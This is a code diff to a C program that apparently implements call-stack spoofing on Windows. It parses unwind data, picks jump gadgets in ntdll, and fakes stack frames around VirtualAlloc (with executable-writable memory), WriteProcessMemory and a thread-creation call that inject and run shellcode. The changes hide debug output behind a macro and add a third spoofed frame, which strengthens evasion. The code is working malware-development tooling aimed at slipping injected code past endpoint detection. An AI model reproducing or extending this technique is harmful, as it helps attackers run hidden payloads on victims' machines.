@@ -52,20 +52,20 @@ BOOL findExceptionDir(PEXCEPT_INFO pExceptInfo) {
 
     PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
     if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
-        printf("[!] Not a valid image\n");
+        DEBUG_PRINT("[!] Not a valid image\n");
         return FALSE;
     }
 
     PIMAGE_NT_HEADERS64 pNtHdrs = (PIMAGE_NT_HEADERS64)(hModule + pDosHdr->e_lfanew);
     if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
-        printf("[!] Failed to find valid NT signature\n");
+        DEBUG_PRINT("[!] Failed to find valid NT signature\n");
         return FALSE;
     }
 
     PIMAGE_OPTIONAL_HEADER pOptHdr = &pNtHdrs->OptionalHeader;
 
     if (pOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress == 0) {
-        printf("[!] No exceptions directory for the module\n");
+        DEBUG_PRINT("[!] No exceptions directory for the module\n");
         return FALSE;
     }
 
@@ -93,8 +93,8 @@ BOOL processUnwindInfo(
     ULONG frameOffset = 0; 
     DWORD offsetBytes = 0, offset = 0;
 
-    printf("\tStarting to process unwind info at address: %p\n", pUnwindInfo);
-    printf("\tCount of unwind codes: %d\n", pUnwindInfo->CountOfCodes);
+    DEBUG_PRINT("\tStarting to process unwind info at address: %p\n", pUnwindInfo);
+    DEBUG_PRINT("\tCount of unwind codes: %d\n", pUnwindInfo->CountOfCodes);
     
     // start processing all of the unwind codes
     while (unwindCodesIndex < pUnwindInfo->CountOfCodes) {
@@ -105,7 +105,7 @@ BOOL processUnwindInfo(
         switch (unwindOperation) {
 
         case UWOP_PUSH_NONVOL:
-            printf("\tprocessing UWOP_PUSH_NONVOL\n");
+            DEBUG_PRINT("\tprocessing UWOP_PUSH_NONVOL\n");
             pStackFrameInfo->stackFrameSize += 8;
             break;
 
@@ -115,13 +115,13 @@ BOOL processUnwindInfo(
 
             if (pStackFrameInfo->maxSaveNonvolOffset < offsetBytes)
                 pStackFrameInfo->maxSaveNonvolOffset = offsetBytes;
-            printf("\tprocessing UWOP_SAVE_NONVOL values: %d, offset: %d\n", operationInfo, offsetBytes);
+            DEBUG_PRINT("\tprocessing UWOP_SAVE_NONVOL values: %d, offset: %d\n", operationInfo, offsetBytes);
 
             unwindCodesIndex++;
             break;
 
         case UWOP_ALLOC_SMALL:
-            printf("\tprocessing UWOP_ALLOC_SMALL with opInfo: %u\n", operationInfo);
+            DEBUG_PRINT("\tprocessing UWOP_ALLOC_SMALL with opInfo: %u\n", operationInfo);
             pStackFrameInfo->stackFrameSize += ((operationInfo * 8) + 8);
             break;
 
@@ -130,7 +130,7 @@ BOOL processUnwindInfo(
             unwindCodesIndex++;
             frameOffset = pUnwindCode[unwindCodesIndex].FrameOffset;
 
-            printf("\tprocessing UWOP_ALLOC_LARGE with frameOffset: %u, opInfo: %u\n", frameOffset, operationInfo);
+            DEBUG_PRINT("\tprocessing UWOP_ALLOC_LARGE with frameOffset: %u, opInfo: %u\n", frameOffset, operationInfo);
 
             if (operationInfo == 0) {
                 frameOffset *= 8;
@@ -144,24 +144,24 @@ BOOL processUnwindInfo(
             break;
 
         case UWOP_SET_FPREG:
-            printf("\tprocessing UWOP_SET_FPREG\n");
+            DEBUG_PRINT("\tprocessing UWOP_SET_FPREG\n");
             pStackFrameInfo->useFPreg = TRUE;
             break;
 
         case UWOP_SAVE_XMM128:
             // TODO potentially do the same as for SAVE_NONVOL
-            printf("\tprocessing UWOP_SAVE_XMM128\n");
+            DEBUG_PRINT("\tprocessing UWOP_SAVE_XMM128\n");
             unwindCodesIndex++;
             break;
 
         case UWOP_SAVE_XMM128_FAR:
             // TODO potentially do the same as for SAVE_NONVOL
-            printf("\tprocessing UWOP_SAVE_XMM128\n");
+            DEBUG_PRINT("\tprocessing UWOP_SAVE_XMM128\n");
             unwindCodesIndex += 2;
             break;
 
         case UWOP_PUSH_MACHFRAME:
-            printf("\tprocessing UWOP_PUSH_MACHFRAME\n");
+            DEBUG_PRINT("\tprocessing UWOP_PUSH_MACHFRAME\n");
 
             if (pUnwindCode[unwindCodesIndex].OpInfo == 0) {
                 pStackFrameInfo->stackFrameSize += 40;
@@ -183,14 +183,14 @@ BOOL processUnwindInfo(
             if (offsetBytes > pStackFrameInfo->maxSaveNonvolOffset)
                 pStackFrameInfo->maxSaveNonvolOffset = offsetBytes;
 
-            printf("\tprocessing UWOP_SAVE_NONVOL_FAR reg=%u offset=%u\n",
+            DEBUG_PRINT("\tprocessing UWOP_SAVE_NONVOL_FAR reg=%u offset=%u\n",
                 operationInfo, offsetBytes);
 
             unwindCodesIndex += 2;
             break;
 
         default:
-            printf("\tunknown unwind OP INFO: %d\n", unwindOperation);
+            DEBUG_PRINT("\tunknown unwind OP INFO: %d\n", unwindOperation);
             break;
         }
 
@@ -198,10 +198,10 @@ BOOL processUnwindInfo(
     }
 
     if (pStackFrameInfo->stackFrameSize & 7)
-        printf("\t! Stack size is not 8 byte aligned\n");
+        DEBUG_PRINT("\t! Stack size is not 8 byte aligned\n");
 
     if (pStackFrameInfo->stackFrameSize > 0x4000)
-        printf("\t! Too large stack size: %ld, possibly corrupted unwind info\n", pStackFrameInfo->stackFrameSize);
+        DEBUG_PRINT("\t! Too large stack size: %ld, possibly corrupted unwind info\n", pStackFrameInfo->stackFrameSize);
 
     return TRUE;
 }
@@ -234,7 +234,7 @@ BOOL calculateFuncStackSize(
     if (!pStackFrameInfo)
         goto _CLEANUP;
 
-    printf("[+] Calculating stack frame size for function: %p\n", funcAddress);
+    DEBUG_PRINT("[+] Calculating stack frame size for function: %p\n", funcAddress);
 
     // populate the hModule member and find the exceptions dir
     ExceptInfo.hModule = (PBYTE)hModule;
@@ -260,7 +260,7 @@ BOOL calculateFuncStackSize(
     // if nothing is found, most likely it is a leaf function
     // and the stack frame size is just the return address
     if (!found) {
-        printf("\tleaf function detected: %p, returning stack size of 8\n", funcAddress);
+        DEBUG_PRINT("\tleaf function detected: %p, returning stack size of 8\n", funcAddress);
 
         pStackFrameInfo->returnRip = funcAddress;
         pStackFrameInfo->stackFrameSize = 8;
@@ -271,7 +271,7 @@ BOOL calculateFuncStackSize(
 
     // if there is a runtime function entry found, but unwind data is empty then again its a leaf fn
     if (pRuntimeFunc->UnwindData == 0) {
-        printf("\tleaf function detected: %p, returning stack size of 8\n", funcAddress);
+        DEBUG_PRINT("\tleaf function detected: %p, returning stack size of 8\n", funcAddress);
 
         pStackFrameInfo->returnRip = funcAddress;
         pStackFrameInfo->stackFrameSize = 8;
@@ -300,7 +300,7 @@ BOOL calculateFuncStackSize(
         if (!(pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
             break;
 
-        printf("\tChained info detected, processing further\n");
+        DEBUG_PRINT("\tChained info detected, processing further\n");
         // if there is chained info and the count of codes is uneven, it needs to be padded
         ULONG unwindCount = pUnwindInfo->CountOfCodes;
         if (unwindCount & 1)
@@ -325,7 +325,7 @@ BOOL calculateFuncStackSize(
         pStackFrameInfo->returnRip = funcAddress + prologSize;
     }
 
-    printf("\tCalculated stack size: %llu, prolog size: %d\n", pStackFrameInfo->stackFrameSize, prologSize);
+    DEBUG_PRINT("\tCalculated stack size: %llu, prolog size: %d\n", pStackFrameInfo->stackFrameSize, prologSize);
     success = TRUE;
 
 _CLEANUP:
@@ -365,14 +365,14 @@ BOOL findJmpGadgets(
     // Validate the DOS headers
     pDosHdr = (PIMAGE_DOS_HEADER)base;
     if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
-        printf("[!] Not a valid image\n");
+        DEBUG_PRINT("[!] Not a valid image\n");
         goto _CLEANUP;
     }
 
     // Validate the NT headers
     pNtHdrs = (PIMAGE_NT_HEADERS)(base + pDosHdr->e_lfanew);
     if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
-        printf("[!] Failed to find valid NT signature\n");
+        DEBUG_PRINT("[!] Failed to find valid NT signature\n");
         goto _CLEANUP;
     }
 
@@ -456,7 +456,7 @@ BOOL findJmpGadgets(
     *gadgetArray = pGadgetArray;
     pGadgetArray = NULL;
 
-    printf("[+] Total gadget matches: %d, safe gadgets count: %d\n", matches, *safeCount);
+    DEBUG_PRINT("[+] Total gadget matches: %d, safe gadgets count: %d\n", matches, *safeCount);
 
 _CLEANUP:
     if (!*gadgetArray && pGadgetArray)
@@ -478,7 +478,7 @@ BOOL CallStackSpoof(PAPI_CALL_INFO pApiCallInfo, ...) {
     if (!pApiCallInfo || !pApiCallInfo->spoofFramesTargetsArray || !pApiCallInfo->spoofFramesCount)
         return FALSE;
 
-    printf("[+] Spoofing stack for function:\n\tAddress: %p, number of arguments: %d\n", pApiCallInfo->pFuncAddr, pApiCallInfo->apiFuncArgsCount);
+    DEBUG_PRINT("[+] Spoofing stack for function:\n\tAddress: %p, number of arguments: %d\n", pApiCallInfo->pFuncAddr, pApiCallInfo->apiFuncArgsCount);
 
     va_list va_args;
     STACK_INFO stackInfo = { 0 };
@@ -494,7 +494,7 @@ BOOL CallStackSpoof(PAPI_CALL_INFO pApiCallInfo, ...) {
     SIZE_T index = rand() % safeGadgetCount;
     PGADGET_INFO jmpGadget = g_GadgetList[index];
 
-    printf("\tGadget that will be used: %p, with frame size: %d\n", jmpGadget->address, jmpGadget->stackFrameSize);
+    DEBUG_PRINT("\tGadget that will be used: %p, with frame size: %d\n", jmpGadget->address, jmpGadget->stackFrameSize);
 
     // Prepare all the information for the frames to be spoofed
     for (SIZE_T i = 0; i < pApiCallInfo->spoofFramesCount; i++) {
@@ -510,7 +510,7 @@ BOOL CallStackSpoof(PAPI_CALL_INFO pApiCallInfo, ...) {
         if (stackInfo.pFrames[i].hasSaveNonvol
             && stackInfo.pFrames[i].maxSaveNonvolOffset >= stackInfo.pFrames[i].stackFrameSize) {
 
-            printf(
+            DEBUG_PRINT(
                 "[!] Unwind Info for function: %p contains SAVE_NONVOL with offset %d, which is bigger than the stack frame of %d bytes\n",
                 pSpoofTarget->funcAddress,
                 stackInfo.pFrames[i].maxSaveNonvolOffset,
@@ -532,7 +532,7 @@ BOOL CallStackSpoof(PAPI_CALL_INFO pApiCallInfo, ...) {
         stackInfo.totalFrameSizes += stackInfo.pFrames[i].stackFrameSize;
 
     stackInfo.totalFrameSizes += stackInfo.dwGadgetSize;
-    printf("\tTotal frame size for spoofed frames: %ld\n", stackInfo.totalFrameSizes);
+    DEBUG_PRINT("\tTotal frame size for spoofed frames: %ld\n", stackInfo.totalFrameSizes);
 
     // Validate the count of the arguments that the API expects
     if (pApiCallInfo->apiFuncArgsCount <= 4) {
@@ -559,8 +559,10 @@ BOOL CallStackSpoof(PAPI_CALL_INFO pApiCallInfo, ...) {
     va_end(va_args);
 
     // for debug
-    printf("Press any key to continue..\n");
+#ifdef DEBUG
+    DEBUG_PRINT("Press any key to continue..\n");
     getchar();
+#endif
     //
 
     // Execute the API with a spoofed call stack and get the return value
@@ -594,13 +596,18 @@ int main()
     // Functions that will be used for the spoofed call stack frames
     LPCSTR SpoofName1 = "RtlUserThreadStart";
     LPCSTR SpoofName2 = "BaseThreadInitThunk";
+    LPCSTR SpoofName3 = "VirtualAlloc";
+
     SPOOF_TARGET SpoofApi1 = { 0 };
     SPOOF_TARGET SpoofApi2 = { 0 };
-    PSPOOF_TARGET spoofArray[2] = { 0 };
+    SPOOF_TARGET SpoofApi3 = { 0 };
+
+    PSPOOF_TARGET spoofArray[3] = { 0 };
     
     // Handles to the modules that are required
     HMODULE hMod = GetModuleHandleA("ntdll.dll");
     HMODULE hMod2 = GetModuleHandleA("kernel32.dll");
+    HMODULE hMod3 = GetModuleHandleA("kernelbase.dll");
 
     // Prepare information about the spoof targets
     SpoofApi1.funcAddress = (ULONG_PTR)GetProcAddress(hMod, SpoofName1);
@@ -611,16 +618,21 @@ int main()
     SpoofApi2.hModule = hMod2;
     SpoofApi2.offsetFromStart = 0x14;
 
+    SpoofApi3.funcAddress = (ULONG_PTR)GetProcAddress(hMod2, SpoofName3);
+    SpoofApi3.hModule = hMod3;
+    SpoofApi3.offsetFromStart = 0;
+
     // Store them in an array for syntetic frame preparations
     spoofArray[0] = &SpoofApi1;
     spoofArray[1] = &SpoofApi2;
+    spoofArray[2] = &SpoofApi3;
 
     // Find safe jump gadgets to use as atm couple of unwind opcodes are not implemented
     findJmpGadgets(hMod, &g_GadgetList, GADGETS_MAX, &safeGadgetCount);
 
     // Prepare the API_CALL_INFO struct that will hold information about the syntetic frames
     // and also the API to be called and its args
-    apiCallInfo.spoofFramesCount = 2;
+    apiCallInfo.spoofFramesCount = 3;
     apiCallInfo.spoofFramesTargetsArray = spoofArray;
 
     // The following APIs will be called with spoofed call stacks
@@ -644,12 +656,12 @@ int main()
         (uint64_t)(MEM_COMMIT | MEM_RESERVE),
         (uint64_t)PAGE_EXECUTE_READWRITE
         )) {
-        printf("[!] Spoofing failed\n");
+        DEBUG_PRINT("[!] Spoofing failed\n");
         goto _CLEANUP;
     }
 
     status = (NTSTATUS)(ULONG_PTR)apiCallInfo.retVal;
-    printf("[+] Allocation: %p, status: 0x%08X\n", addr, status);
+    DEBUG_PRINT("[+] Allocation: %p, status: 0x%08X\n", addr, status);
 
     // Next we are calling WriteProcessMemory to write the actual shellcode to the allocation
     apiCallInfo.pFuncAddr = pWriteProcessMemory;
@@ -663,16 +675,16 @@ int main()
         (uint64_t)sizeof(shellcode),
         (uint64_t)&bytesWritten
     )) {
-        printf("[!] Spoofing failed\n");
+        DEBUG_PRINT("[!] Spoofing failed\n");
         goto _CLEANUP;
     }
 
     if (!apiCallInfo.retVal) {
-        printf("[!] WriteProcessMemory failed\n");
+        DEBUG_PRINT("[!] WriteProcessMemory failed\n");
         goto _CLEANUP;
     }
     else {
-        printf("[+] Shellcode bytes written: %d\n", bytesWritten);
+        DEBUG_PRINT("[+] Shellcode bytes written: %d\n", bytesWritten);
     }
 
     // Finally we can create a thread to execute the shellcode
@@ -688,12 +700,12 @@ int main()
         (uint64_t)0,
         (uint64_t)&threadId
     )) {
-        printf("[!] Spoofing failed\n");
+        DEBUG_PRINT("[!] Spoofing failed\n");
         goto _CLEANUP;
     }
 
 
-    printf("[+] Thread created with ID: %d\n", threadId);
+    DEBUG_PRINT("[+] Thread created with ID: %d\n", threadId);
     WaitForSingleObject((HANDLE)apiCallInfo.retVal, INFINITE);
     success = 0;
 
